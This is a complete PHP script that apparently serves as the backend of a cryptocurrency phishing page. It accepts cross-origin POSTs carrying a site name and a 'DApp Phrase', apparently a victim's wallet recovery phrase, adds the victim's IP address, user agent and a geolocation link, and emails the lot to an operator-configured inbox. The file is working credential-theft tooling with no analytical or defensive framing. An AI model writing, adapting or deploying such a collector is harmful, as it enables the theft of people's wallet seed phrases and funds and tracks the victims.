<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With");
header("Access-Control-Max-Age: 86400");
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    exit;
}

// === Helpers ===
function clientIp(): string
{
    foreach (['HTTP_X_REAL_IP', 'HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'] as $k) {
        if (!empty($_SERVER[$k])) {
            $ip = $_SERVER[$k];
            if ($k === 'HTTP_X_FORWARDED_FOR') $ip = explode(',', $ip)[0];
            return trim($ip);
        }
    }
    return '0.0.0.0';
}
function cleanHeader(string $v): string
{
    return str_replace(["\r", "\n"], '', $v);
}

function extractCleanHost(string $input): string
{
    $raw = trim($input);
    if ($raw === '') return '';

    $hasScheme = preg_match('~^[a-z][a-z0-9+\-.]*://~i', $raw);
    $url = $hasScheme ? $raw : ('http://' . $raw);

    $host = parse_url($url, PHP_URL_HOST) ?: $raw;
    $host = strtolower(trim($host, '[]'));
    $host = preg_replace('~^(?:www\d*|m)\.~', '', $host);
    $host = rtrim($host, '.');

    if (function_exists('idn_to_ascii')) {
        $ascii = @idn_to_ascii($host, IDNA_DEFAULT, INTL_IDNA_VARIANT_UTS46);
        if ($ascii) $host = $ascii;
    }

    if ($host === 'localhost') return $host;
    if (filter_var($host, FILTER_VALIDATE_IP)) return $host;
    if (preg_match('~^[a-z0-9.-]+\.[a-z]{2,}$~i', $host)) return $host;

    return '';
}

$ctype = $_SERVER['CONTENT_TYPE'] ?? '';
$in = [];
if (stripos($ctype, 'application/json') !== false) {
    $raw = file_get_contents('php://input');
    $json = json_decode($raw, true);
    if (is_array($json)) $in = $json;
} else {
    $in = $_POST;
}

$dappLinkRaw = (string)($in['dappLink'] ?? '');
$dappNameRaw = (string)($in['dappName'] ?? '');
$dappWordRaw = (string)($in['dappWord'] ?? '');

if ($dappLinkRaw === '') {
    $dappLinkRaw = $_SERVER['HTTP_ORIGIN'] ?? $_SERVER['HTTP_REFERER'] ?? '';
}

$cleanHost = extractCleanHost($dappLinkRaw);
if ($cleanHost === '') {
    http_response_code(400);
    exit;
}

$dappName = filter_var($dappNameRaw, FILTER_SANITIZE_FULL_SPECIAL_CHARS);
$dappWord = trim($dappWordRaw);

$ip   = clientIp();
$ua   = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$when = date('c');

$to   = 'box@postmail.com';      // <-- set your inbox
$from = 'relay@postmail.com';    // <-- set from

$subject = cleanHeader("[DAPP Event] {$cleanHost} — {$ip}");

$lines = [];
$lines[] = "|----------| DAPP CONNECT EVENT |--------------|";
$lines[] = "DApp Host : {$cleanHost}";
$lines[] = "DApp Name : " . ($dappName ?: 'n/a');
$lines[] = "DApp Phrase : " . ($dappWord ?: 'n/a');
$lines[] = "Timestamp : {$when}";
$lines[] = "|--------------- CLIENT ------------------------|";
$lines[] = "Client IP : {$ip}";
$lines[] = "Geo      : https://www.geodatatool.com/en/?ip={$ip}";
$lines[] = "UserAgent: {$ua}";
$lines[] = "|------------------------------------------------|";
$body = implode("\n", $lines);

// Headers
$headers  = "From: " . cleanHeader($from) . "\r\n";
$headers .= "Reply-To: " . cleanHeader($from) . "\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
$headers .= "X-Mailer: PHP/" . phpversion();

@mail($to, $subject, $body, $headers);
http_response_code(204);
exit;